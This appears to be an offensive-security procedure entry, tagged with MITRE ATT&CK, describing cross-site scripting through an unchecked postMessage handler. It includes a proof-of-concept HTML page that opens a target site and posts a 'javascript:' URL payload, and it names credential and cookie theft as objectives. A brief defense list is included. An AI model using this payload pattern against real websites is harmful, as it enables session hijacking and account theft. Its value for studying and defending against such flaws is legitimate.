---
id: 7b457cd2-26c4-4b8d-96fd-222bcbe1e552
name: XSS through PostMessage Button Click
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:42.179252+00:00'
updated_at: '2023-04-10T20:21:54.073361+00:00'
tactics:
- '[[Defense Evasion|TA0005 - Defense Evasion]]'
- '[[Execution|TA0002 - Execution]]'
techniques:
- '[[Scripting|T1064 - Scripting]]'
tags:
- '[[Cross Site Scripting]]'
- '[[XSS in PostMessage]]'
commands:
- '[[Click button to open a new window and execute script]]'
---

# XSS through PostMessage Button Click

## Summary

This procedure involves exploiting a vulnerability in PostMessage to execute a cross-site scripting (XSS) attack through a button click. An attacker can inject malicious code into a website that uses PostMessage to communicate between different domains or windows. When a user clicks on a button on 

## Description

# Description

This procedure involves exploiting a vulnerability in PostMessage to execute a cross-site scripting (XSS) attack through a button click. An attacker can inject malicious code into a website that uses PostMessage to communicate between different domains or windows. When a user clicks on a button on the vulnerable website, the injected code is executed on the user's browser, allowing the attacker to steal sensitive information, such as login credentials or session cookies. This attack can be used to gain initial access to a target organization's network, and can be difficult to detect and mitigate.

 

## Requirements

1. Access to a vulnerable website that uses PostMessage to communicate between different domains or windows.

1. Knowledge of how to inject malicious code into the website.

 

## Defense

1. Implement input validation and sanitization on all user input to prevent injection of malicious code.

1. Use Content Security Policy (CSP) to restrict the sources of content that can be loaded on a webpage.

1. Implement strict cross-origin resource sharing (CORS) policies to prevent unauthorized access to resources from different domains.

 

## Objectives

1. Execute a successful XSS attack through a button click on a vulnerable website.

1. Steal sensitive information, such as login credentials or session cookies.

1. Gain initial access to a target organization's network.

 

# Instructions

1. This command is used to perform a Cross-Site Scripting (XSS) attack through a button click. 

 



**Code**: [[<html>
<body>
    <input type=button value="Click ]]



> The attacker creates a webpage with a button that, when clicked, opens a new window to the target website. After a delay of 2 seconds, the attacker sends a message to the new window with a payload that executes a JavaScript code to display a confirmation box with the message 'XSS'. This attack can be used to steal credentials, inject malicious code or perform other malicious actions on the target website.



**Command** ([[Click button to open a new window and execute script]]):

```bash
<html>
<body>
    <input type=button value="Click Me" id="btn">
</body>

<script>
document.getElementById('btn').onclick = function(e){
    window.poc = window.open('http://www.redacted.com/#login');
    setTimeout(function(){
        window.poc.postMessage(
            {
                "sender": "accounts",
                "url": "javascript:confirm('XSS')",
            },
            '*'
        );
    }, 2000);
}
</script>
</html>
```



## MITRE ATT&CK Mapping

### Tactics

- [[Defense Evasion|TA0005 - Defense Evasion]]
- [[Execution|TA0002 - Execution]]

### Techniques

- [[Scripting|T1064 - Scripting]]

## Commands Used

- [[Click button to open a new window and execute script]]

## Tags

- [[Cross Site Scripting]]
- [[XSS in PostMessage]]


